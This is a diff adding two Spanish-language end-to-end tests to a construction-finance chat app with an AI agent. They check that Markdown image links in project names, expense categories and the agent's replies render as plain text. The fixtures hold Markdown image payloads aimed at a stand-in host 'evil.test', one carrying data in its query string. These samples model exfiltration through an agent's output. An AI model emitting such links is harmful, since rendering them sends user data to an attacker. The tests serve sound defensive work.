@@ -484,3 +484,44 @@ def test_f03_seg_2_avisos_escapan_nombres(e2e):
     exitos = [m.value for m in at.success]
     assert exitos and "![x](https://" not in exitos[0]
     assert r"\!\[x\]" in exitos[0]
+
+
+def test_f03_seg_3_avisos_del_chat_escapan_nombres(e2e):
+    """F-03-SEG-3 (revisión PR #5): los avisos de lo que guardó el agente no
+    interpretan Markdown de nombres de obra o rubro, ni en la respuesta ni en el
+    historial."""
+
+    _obra(e2e, nombre="![o](https://evil.test/o.png)")
+    e2e.db.table("rubros").insert({"nombre": "![r](https://evil.test/r.png)", "orden": 5}).execute()
+    e2e.script(
+        tool_call(
+            "registrar_gasto",
+            {"monto": 10, "descripcion": "x", "rubro": "![r](https://evil.test/r.png)"},
+        ),
+        AIMessage(content="Listo."),
+    )
+    at = e2e.login()
+    at.sidebar.selectbox[0].set_value(1).run()
+    at = at.chat_input[0].set_value("Cargá 10").run()
+
+    avisos = [c.value for c in at.caption if "Gasto registrado" in c.value]
+    assert avisos and all("](https://" not in a for a in avisos)
+    assert len(finanzas.list_gastos(e2e.db, 1)) == 1
+
+    at = at.run()  # siguiente carga: el aviso sale del historial de la sesión
+    avisos = [c.value for c in at.caption if "Gasto registrado" in c.value]
+    assert avisos and all("](https://" not in a for a in avisos)
+
+
+def test_f03_seg_4_respuesta_del_agente_no_carga_imagenes(e2e):
+    """F-03-SEG-4: si la respuesta del agente trae una imagen (por ejemplo, copiada
+    de un dato malicioso), se muestra como texto, también en el historial."""
+
+    _obra(e2e)
+    e2e.script(AIMessage(content="Listo ![x](https://evil.test/p.png?d=datos) **ok**"))
+    at = e2e.login().chat_input[0].set_value("hola").run()
+
+    crudos = "\n".join(m.value for m in at.markdown)
+    assert "](https://evil.test" not in crudos and "[imagen: x]" in crudos and "**ok**" in crudos
+    at = at.run()
+    assert "](https://evil.test" not in "\n".join(m.value for m in at.markdown)
